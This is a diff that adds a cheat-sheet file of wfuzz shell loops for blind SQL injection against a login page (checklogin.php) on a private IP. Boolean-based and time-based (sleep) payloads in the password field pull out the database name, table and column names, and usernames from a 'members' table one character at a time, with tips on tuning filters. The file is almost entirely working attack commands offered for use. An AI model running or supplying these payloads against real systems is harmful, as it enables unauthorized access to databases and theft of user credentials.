@@ -1,0 +1,40 @@
+#modify the value of the argument "d" to your exactly payload.if your payload is GET method,you should not to use the "d" argument
+#but the main payload you should not modify its. like "(ascii(substr((select column_name from information_schema.columns where table_name="
+
+#take care of the "Condition string", "or" and "and" may led to different result,or you may not find it vulnerbal
+
+#to change the mysql result row,just modify the "limit" query optimization,"limit 0,1" is the first data row,and "limit 1,1" is the second data row.
+
+#the hide char argument "--hh" is also up to diffrent situation,too.
+
+#the "grep" linux shell can filter the useful information for us.but the filter vaule is up to the diffrent situation
+#In "Bool injection",my "grep" filter by the ID number of the result of wfuzz
+#In "Time injection",my "grep" filter by the reponse time.notice that in "Time injection",I use the "v" argument in wfuzz to output the reponse time
+
+fuzz the current database
+
+for i in $(seq 1 20);do wfuzz --hh 109 -z range,32-127 -d "myusername=aa&mypassword=1' or (select (ord(right(left((select database()),$i),1)) = FUZZ))#Submit=Login" http://192.168.92.146/checklogin.php | grep '000'; done
+
+for i in $(seq 1 20);do wfuzz -v -z range,32-127 -d "myusername=aa&mypassword=1' or if((select ord(right(left((select database()),$i),1)))=FUZZ,sleep(2),1)#Submit=Login" http://192.168.92.146/checklogin.php | grep '4\.'; done
+
+
+fuzz the tables
+
+for i in $(seq 1 10); do wfuzz -z range,32-127 -d "myusername=aa&mypassword=1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ #&Submit=Login" http://192.168.92.146/checklogin.php | grep '000';done
+
+for i in $(seq 1 10); do wfuzz -v -z range,32-127 -d "myusername=aa&mypassword=1' or if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(2),1) #&Submit=Login" http://192.168.92.146/checklogin.php | grep '4\.';done
+
+fuzz the columns
+
+for i in $(seq 1 10); do wfuzz --hh 109 -z range,32-127 -d "myusername=aa&mypassword=1' or (ascii(substr((select column_name from information_schema.columns where table_name='members' limit 1,1),$i,1)))=FUZZ #&Submit=Login" http://192.168.92.146/checklogin.php | grep '000';done
+
+for i in $(seq 1 10); do wfuzz -v -z range,32-127 -d "myusername=aa&mypassword=1' or if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='members' limit 1,1)=FUZZ, sleep(2),1) #&Submit=Login" http://192.168.92.146/checklogin.php | grep '4\.';done
+
+
+fuzz the data
+
+for i in $(seq 1 10); do wfuzz --hh 109 -z range,32-127 -d "myusername=aa&mypassword=1' or (ascii(substr((select username from members limit 1,1),$i,1)))=FUZZ #&Submit=Login" http://192.168.92.146/checklogin.php | grep '000';done
+
+for i in $(seq 1 10); do wfuzz -v -z range,32-127 -d "myusername=aa&mypassword=1' or if((select ascii(substr(username,$i,1))from members limit 0,1)=FUZZ, sleep(2),1) #&Submit=Login" http://192.168.92.146/checklogin.php | grep '4\.';done
+
+
